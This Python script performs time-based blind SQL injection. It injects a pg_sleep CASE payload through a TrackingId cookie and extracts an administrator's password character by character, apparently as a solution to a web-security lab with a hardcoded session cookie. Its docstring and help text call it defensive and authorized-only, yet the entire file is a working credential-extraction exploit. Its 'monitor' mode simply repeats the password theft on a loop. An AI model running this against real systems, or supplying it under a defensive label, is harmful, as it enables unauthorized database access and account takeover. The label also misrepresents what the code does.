#!/usr/bin/env python3
"""
SQL Injection vulnerability tester for defensive security purposes.
Tests for time-based blind SQL injection by measuring response times.
"""

import requests
import time
import sys
from typing import Dict, List, Tuple
import argparse
from datetime import datetime
import logging
from urllib.parse import quote

class SQLInjectionTester:
    def __init__(self, target_url: str, delay_threshold: float = 1.5):
        self.target_url = target_url
        self.delay_threshold = delay_threshold
        self.session = requests.Session()
        
        # Set up logging
        self.logger = logging.getLogger('SQLInjectionTester')
        handler = logging.StreamHandler()
        formatter = logging.Formatter('[%(asctime)s] %(levelname)s - %(message)s', datefmt='%H:%M:%S')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.DEBUG)
        
    def test_character(self, position: int, character: str, username: str = 'administrator') -> Tuple[bool, float]:
        """Test if a character at a specific position matches using time-based SQL injection."""
        
        # Craft the SQL injection payload - matching the format from the user
        sqli_payload = f"'; SELECT CASE WHEN (username='{username}' AND SUBSTRING(password,{position},1)='{character}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--"
        
        self.logger.debug(f"Testing position {position}, character '{character}'")
        self.logger.debug(f"SQL payload: {sqli_payload}")
        
        # URL encode the payload
        encoded_payload = quote(sqli_payload)
        self.logger.debug(f"Encoded payload: {encoded_payload}")
        
        # Set up headers and cookies
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'gzip, deflate, br',
            'Priority': 'u=0, i'
        }
        
        cookies = {
            'TrackingId': f'L6Gvn3a8kwHaAiEG{encoded_payload}',
            'session': '1QGUaVb1PbauWrVxnlc7cWdBZCxlzKVh'
        }
        
        self.logger.debug(f"Cookie TrackingId: L6Gvn3a8kwHaAiEG{encoded_payload}")
        
        # Measure response time
        start_time = time.time()
        try:
            self.logger.debug(f"Sending request to {self.target_url}")
            response = self.session.get(self.target_url, headers=headers, cookies=cookies, timeout=5)
            elapsed_time = time.time() - start_time
            
            self.logger.info(f"Response time: {elapsed_time:.2f}s (status: {response.status_code})")
            
            # Check if delay indicates a match
            is_match = elapsed_time >= self.delay_threshold
            
            if is_match:
                self.logger.warning(f"MATCH FOUND! Character '{character}' at position {position} caused delay of {elapsed_time:.2f}s")
            
            return is_match, elapsed_time
        except requests.exceptions.Timeout:
            return True, 5.0  # Timeout likely means the sleep worked
        except Exception as e:
            print(f"Error testing character: {e}")
            return False, 0.0
    
    def extract_password(self, username: str = 'administrator', max_length: int = 50) -> str:
        """Extract password using time-based blind SQL injection."""
        
        # Character set to test (common password characters)
        charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'
        
        password = ""
        
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Starting password extraction for user: {username}")
        print(f"Target URL: {self.target_url}")
        print(f"Delay threshold: {self.delay_threshold} seconds")
        print("-" * 60)
        
        for position in range(1, max_length + 1):
            found_char = False
            
            for char in charset:
                is_match, response_time = self.test_character(position, char, username)
                
                if is_match:
                    password += char
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] Position {position}: Found '{char}' (delay: {response_time:.2f}s)")
                    print(f"Current password: {password}")
                    found_char = True
                    break
                else:
                    sys.stdout.write(f"\r[{datetime.now().strftime('%H:%M:%S')}] Position {position}: Testing '{char}' (delay: {response_time:.2f}s)")
                    sys.stdout.flush()
            
            if not found_char:
                print(f"\n[{datetime.now().strftime('%H:%M:%S')}] No character found at position {position}. Password extraction complete.")
                break
        
        return password
    
    def continuous_monitor(self, interval: int = 60):
        """Continuously monitor the site for SQL injection vulnerabilities."""
        
        print(f"Starting continuous monitoring of {self.target_url}")
        print(f"Check interval: {interval} seconds")
        print("Press Ctrl+C to stop monitoring")
        print("=" * 60)
        
        check_count = 0
        extracted_password = ""
        current_position = 1
        
        try:
            while True:
                check_count += 1
                print(f"\n[Check #{check_count}] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                
                # Test all a-z and 0-9 characters at current position
                print(f"Testing position {current_position} for SQL injection vulnerability...")
                found_char = False
                
                for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
                    is_match, response_time = self.test_character(current_position, char)
                    
                    if is_match:
                        # Found a matching character
                        extracted_password += char
                        found_char = True
                        print(f"\n[VULNERABLE] Found character '{char}' at position {current_position} (delay: {response_time:.2f}s)")
                        print(f"Extracted password so far: {extracted_password}")
                        current_position += 1
                        break
                    else:
                        sys.stdout.write(f"\rTesting '{char}' at position {current_position} (delay: {response_time:.2f}s)")
                        sys.stdout.flush()
                
                if not found_char:
                    print(f"\n[INFO] No character found at position {current_position}")
                    if extracted_password:
                        print(f"[VULNERABLE] Password extraction complete!")
                        print(f"Final extracted password: {extracted_password}")
                        print(f"Password length: {len(extracted_password)} characters")
                        # Don't reset - password extraction is complete
                    else:
                        print("[SECURE] No time-based SQL injection detected")
                        # Only reset if we haven't found any password
                        current_position = 1
                        extracted_password = ""
                
                print(f"\nNext check in {interval} seconds...")
                time.sleep(interval)
                
        except KeyboardInterrupt:
            print("\n\nMonitoring stopped by user")
            print(f"Total checks performed: {check_count}")
            if extracted_password:
                print(f"Last extracted password: {extracted_password}")

def main():
    parser = argparse.ArgumentParser(
        description='SQL Injection Vulnerability Tester - For defensive security testing only',
        epilog='This tool is for authorized security testing only. Do not use on systems you do not own or have permission to test.'
    )
    
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('--mode', choices=['extract', 'monitor'], default='monitor',
                        help='Mode: extract (extract password once) or monitor (continuous monitoring)')
    parser.add_argument('--interval', type=int, default=5,
                        help='Check interval in seconds for monitor mode (default: 5)')
    parser.add_argument('--threshold', type=float, default=1.5,
                        help='Response delay threshold in seconds (default: 1.5)')
    parser.add_argument('--username', default='administrator',
                        help='Username to test (default: administrator)')
    
    args = parser.parse_args()
    
    # Create tester instance
    tester = SQLInjectionTester(args.url, args.threshold)
    
    print("=" * 60)
    print("SQL INJECTION VULNERABILITY TESTER")
    print("For authorized defensive security testing only")
    print("=" * 60)
    
    if args.mode == 'extract':
        # One-time password extraction
        password = tester.extract_password(args.username)
        print(f"\nExtracted password: {password}")
    else:
        # Continuous monitoring
        tester.continuous_monitor(args.interval)

if __name__ == "__main__":
    main()